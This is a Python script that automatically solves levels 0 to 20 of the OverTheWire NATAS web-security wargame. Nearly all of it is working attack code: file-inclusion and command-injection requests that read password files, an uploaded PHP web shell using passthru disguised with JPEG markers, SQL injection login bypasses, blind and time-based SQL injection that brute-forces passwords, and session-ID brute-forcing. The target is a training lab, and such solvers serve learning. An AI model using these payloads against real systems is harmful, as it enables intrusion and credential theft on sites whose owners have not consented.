import http.client
import urllib.parse
import string, re, base64, json, time

host = "natas.labs.overthewire.org"
login = "natas"
passwords = ["natas0"]
level = -1

def req(method, url, headers={}, body=""):
    auth = base64.b64encode("{}{}:{}".format(login, level, passwords[level]).encode()).decode()
    headers["Authorization"] = "Basic {}".format(auth)
    conn = http.client.HTTPConnection("{}{}.{}".format(login, level, host))
    conn.request(
        method,
        url,
        headers=headers,
        body=body,
    )
    
    return(conn.getresponse())

def rex(method, url, regexp, headers={}, body="", log=True):
    if log: print(" Request to web server: ", end="")
    res = req(method, url, headers, body)
    reg = None
    data = res.read().decode(errors="ignore")
    if res.status == 200:
        if log: print("OK")
        reg = re.search(regexp, data)
    else:
        if log: print("Error ({})".format(res.status))

    return(res, reg)

def level0():
    print(" Search password in the source code of the page")
    res, reg = rex(
        "GET",
        "/",
        "<!--The password for natas[12] is (\w+) -->"
    )
    
    if res.status != 200: return
    if reg:
        if len(passwords) == level + 1: passwords.append(reg[1])
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")

def level2():
    if level == 2: f = "/files/users.txt"
    elif level == 3: f = "/s3cr3t/users.txt"

    print(" Search password in file {}".format(f))
    res, reg = rex("GET", f, "natas[34]:(\w+)")
    if res.status != 200: return
    if reg:
        if len(passwords) == level + 1: passwords.append(reg[1])
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")

def level4():
    r = "http://natas5.natas.labs.overthewire.org/"
    print(" Set Referer header to {}".format(r))
    res, reg = rex(
        "GET",
        "/",
        "The password for natas5 is (\w+)",
        headers={"Referer": r}
    )

    if res.status != 200: return
    if reg:
        if len(passwords) == level + 1: passwords.append(reg[1])
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")

def level5():
    c = "loggedin=1"
    print(" Set Cookie header to {}".format(c))
    res, reg = rex(
        "GET",
        "/",
        "The password for natas6 is (\w+)",
        headers={"Cookie": c}
    )

    if res.status != 200: return
    if reg:
        if len(passwords) == level + 1: passwords.append(reg[1])
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")

def level6():
    f = "/includes/secret.inc"
    print(" Search secret in file {}: ".format(f))
    res, reg = rex("GET", f, "\$secret = \"(\w+)\";")
    if res.status != 200: return
    if reg:
        print(" Post form with secret {}".format(reg[1]))
        res, reg = rex(
            "POST",
            "/",
            "The password for natas7 is (\w+)",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body="secret={}&submit=submit".format(reg[1])
        )

        if res.status != 200: return
        if reg:
            if len(passwords) == level + 1: passwords.append(reg[1])
            print(" Password found: {}".format(passwords[level + 1]))
        else:
            print(" Password not found")
    else:
        print(" Secret not found")

def level7():
    u = "/index.php?page=/etc/natas_webpass/natas8"
    print(" Get page {}".format(u))
    res, reg = rex(
        "GET",
        u,
        "<br>\n<br>\n(\w+)\n",
    )

    if res.status != 200: return
    if reg:
        if len(passwords) == level + 1: passwords.append(reg[1])
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")

def level8():
    f = "/index-source.html"
    print(" Search secret in {}".format(f))
    res, reg = rex(
        "GET",
        f,
        "\$encodedSecret&nbsp;=&nbsp;\"(\w+)\";",
    )

    if res.status != 200: return
    if reg:
        s = reg[1]
        print(" Decoding secret {}".format(s))
        s = base64.b64decode(bytes.fromhex(s).decode()[::-1]).decode()
        print(" Post form with secret {}".format(s))
        res, reg = rex(
            "POST",
            "/",
            "The password for natas9 is (\w+)\n",
            headers={"Content-type": "application/x-www-form-urlencoded"},
            body="secret={}&submit=submit".format(s),
        )

        if res.status != 200: return
        if reg:
            if len(passwords) == level + 1: passwords.append(reg[1])
            print(" Password found: {}".format(passwords[level + 1]))
        else:
                    print(" Password not found")
    else:
        print(" Secret not found")

def level9():
    u = "/?needle={}&submit=Search".format(
        urllib.parse.quote("\"\" /etc/natas_webpass/natas{} #".format(level + 1))
    )

    print(" Get page {}".format(u))
    res, reg = rex(
        "GET",
        u,
        "<pre>\n(\w+)\n</pre>",
    )

    if res.status != 200: return
    if reg:
        if len(passwords) == level + 1: passwords.append(reg[1])
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")        
        
def level11():
    def enc(data, key):
        out = ""
        for i in range(0, len(data)):
            out += chr(ord(data[i]) ^ ord(key[i % len(key)]))

        return(out)
    
    print(" Get cookie")
    res, reg = rex("GET", "/", "")
    
    if res.status != 200: return
    c = res.getheader("Set-Cookie")
    print(" Decoding cookie {}".format(c))
    c = c.split("=")
    if len(c) != 2 or c[0] != "data":
        print(" Unknown cookie format")
        return

    c = urllib.parse.unquote(c[1])
    d = base64.b64decode(c).decode()[:-1] # Remove last char 0x0c (form feed)
    key = enc(
        d,
        json.dumps(
            {"showpassword": "no", "bgcolor": "#ffffff"},
            separators=(",", ":"),
        ),
    )
    
    print(" Key {}".format(key))

    c = json.dumps(
        {"showpassword": "yes", "bgcolor": "#ffffff"},
        separators=(",", ":"),
    )

    c = "data=" + urllib.parse.quote(base64.b64encode(enc(c, key).encode()).decode())
    print(" Set new cookie to {}".format(c))
    res, reg = rex(
        "GET",
        "/",
        "The password for natas12 is (\w+)<br>",
        headers={"Cookie": c}
    )
    
    if reg:
        if len(passwords) == level + 1: passwords.append(reg[1])
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")

def level12():
    print(" Upload PHP file")
    d = "<b><? passthru(\"cat /etc/natas_webpass/natas{}\"); ?></b>".format(level + 1)
    if level == 13:
        # JPEG/EXIF markers
        d = "\xff\xd8" + \
            "\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00" + \
            d + \
            "\xff\xd9"

    # multipart/form-data body
    b = "--BOUNDARY\r\n" + \
        "Content-Disposition: form-data; name=\"filename\"\r\n\r\n" + \
        "file.php\r\n" + \
        "--BOUNDARY\r\n" + \
        "Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"file.php\"\r\n\r\n" + \
        d +  "\r\n" + \
        "--BOUNDARY\r\n"
    
    res, reg = rex(
        "POST",
        "/",
        "The file <a href=\"upload/(\w+\.\w+)\">",
        headers={"Content-Type": "multipart/form-data; boundary=BOUNDARY"},
        body=b,
    )

    if res.status != 200: return
    if reg:
        f = "/upload/" + reg[1]
        print(" Get page {}".format(f))
        res, reg = rex("GET", f, "<b>(\w+)\n</b>")
        if res.status != 200: return
        if reg:
            if len(passwords) == level + 1: passwords.append(reg[1])
            print(" Password found: {}".format(passwords[level + 1]))
        else:
            print(" Password not found")        

def level14():
    p = "username=\" or \"\" = \"&password=\" or \"\" = \""
    print(" SQL injection {}".format(p))
    res, reg = rex(
        "POST",
        "/index.php",
        "The password for natas15 is (\w+)<br>",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=p,
    )

    if res.status != 200: return
    if reg:
        if len(passwords) == level + 1: passwords.append(reg[1])
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")        

def level15():
    b = "username=natas16\" and password like binary \""
    print(" Blind SQL injection {}".format(b))
    p = ""
    c = True
    s = string.ascii_letters + string.digits
    print(" Bruteforce password: ", end="", flush=True)
    while c:
        for i in s:
            res, reg = rex(
                "POST",
                "/index.php",
                "This user exists",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                body="{}{}{}%".format(b, p, i),
                log=False,
            )

            if res.status != 200: return
            if reg:
                p += i
                print(i, end="", flush=True)
                break
            else:
                if i == s[-1]:
                    c = False
                    break

    print()
    if p != "":
        if len(passwords) == level + 1: passwords.append(p)
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")

def level16():
    u = "/?needle="
    bs = "$(grep ^"
    be = " /etc/natas_webpass/natas17)unchristian"
    print(" Blind injection {}{}{}".format(u, bs, be))
    p = ""
    c = True
    s = string.ascii_letters + string.digits
    print(" Bruteforce password: ", end="", flush=True)
    while c:
        for i in s:
            r = urllib.parse.quote("{}{}{}{}".format(bs, p, i, be))
            res, reg = rex(
                "GET",
                u + r,
                "<pre>\n</pre>",
                log=False,
            )

            if res.status != 200: return
            if reg:
                p += i
                print(i, end="", flush=True)
                break
            else:
                if i == s[-1]:
                    c = False
                    break

    print()
    if p != "":
        if len(passwords) == level + 1: passwords.append(p)
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")

def level17():
    u = "username="
    bs = "natas18\" or 1 = if((select count(*) from users where password like binary \""
    be = "%\" = 1), sleep(1), null) #"
    print(" Time-based blind SQL injection {}{}{}".format(u, bs, be))
    print(" Measure response time: ", end="")
    m = time.time()
    res = req(
        "POST",
        "/index.php",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=u + "test",
    )
    m = time.time() - m
    if res.status != 200: return
    print("{} sec".format(m))
    p = ""
    c = True
    s = string.ascii_letters + string.digits
    print(" Bruteforce password: ", end="", flush=True)
    while c:
        for i in s:
            r = urllib.parse.quote("{}{}{}{}".format(bs, p, i, be))
            t = time.time()
            res = req(
                "POST",
                "/index.php",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                body=u + r,
            )

            t = time.time() - t
            if res.status != 200: return
            if t > m * 2:
                p += i
                print(i, end="", flush=True)
                break
            else:
                if i == s[-1]:
                    c = False
                    break

    print()
    if p != "":
        if len(passwords) == level + 1: passwords.append(p)
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")

def level18():
    m = 640
    u = "admin"
    p = ""
    print(" Bruteforce PHPSESSID from 1 to {}".format(m))
    for i in range(1, m):
        if level == 18: s = i
        elif level == 19:
            s = "".join(
                "{:02x}".format((ord(c))) for c in "{}-{}".format(i, u)
            )
            
        res, reg = rex(
            "POST",
            "/index.php",
            "Password: (\w+)</pre>",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "PHPSESSID={}".format(s),
            },
            body="username={}&password=pass".format(u),
            log=False,
        )

        if res.status != 200: return
        if reg:
            print(" Found admin session ID {}".format(i))
            p = reg[1]
            break
        
    if p != "":
        if len(passwords) == level + 1: passwords.append(reg[1])
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")

def level20():
    d = "admin\nadmin 1"
    print(" Session file injection {}".format(d.replace("\n", "\\n")))
    res, reg = rex(
        "POST",
        "/index.php",
        "",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body="name={}".format(d),
    )

    if res.status != 200: return
    c = res.getheader("Set-Cookie")
    res, reg = rex(
        "POST",
        "/index.php",
        "Password: (\w+)</pre>",
        headers={"Cookie": c},
    )

    if res.status != 200: return
    if reg:
        if len(passwords) == level + 1: passwords.append(reg[1])
        print(" Password found: {}".format(passwords[level + 1]))
    else:
        print(" Password not found")
        
def levelN():
    print("Level {} not implemented yet".format(level))
    return

levels = [
    level0, level0, level2, level2,
    level4, level5, level6, level7,
    level8, level9, level9, level11,
    level12, level12, level14, level15,
    level16, level17, level18, level18,
    level20, levelN, levelN, levelN,
    levelN, levelN, levelN, levelN,
    levelN, levelN, levelN, levelN,
    levelN, levelN, levelN,
]

print("___________________________")
print()
print(" OverTheWire wargame NATAS")
print("___________________________")
print()
print("Type help or ? for list of commands")

while True:
    cmd = input("> ").strip()
    if cmd == "": continue
    elif cmd == "quit" or cmd == "exit":
        exit()
    elif cmd == "help" or cmd == "?":
        print("passwords")
        print("level <n>")
        print("next")
        print("help")
        print("quit")
    elif cmd == "passwords":
        print("Level passwords:")
        for k, v in enumerate(passwords):
            print(" {}{} {}".format(login, k, v))
    elif cmd == "level":
        print("Current level {}".format(level))
    elif cmd.startswith("level "):
        c = cmd.split(" ")
        if len(c) != 2 or not c[1].isdigit(): continue
        level = int(c[1])
        
        if level < 0 or level > 34:
            print("Level must be between 0-34")
            continue

        if level >= len(passwords):
            print("You should complete level {} first".format(len(passwords) - 1))
            continue

        print("[Level {}]".format(level))
        levels[level]()
    elif cmd == "next" or cmd == "n":
        if level > 34:
            print("You have reached the maximum level")
            continue
        else:
            level += 1

        print("[Level {}]".format(level))
        levels[level]()
    else:
        print("Unknown command")
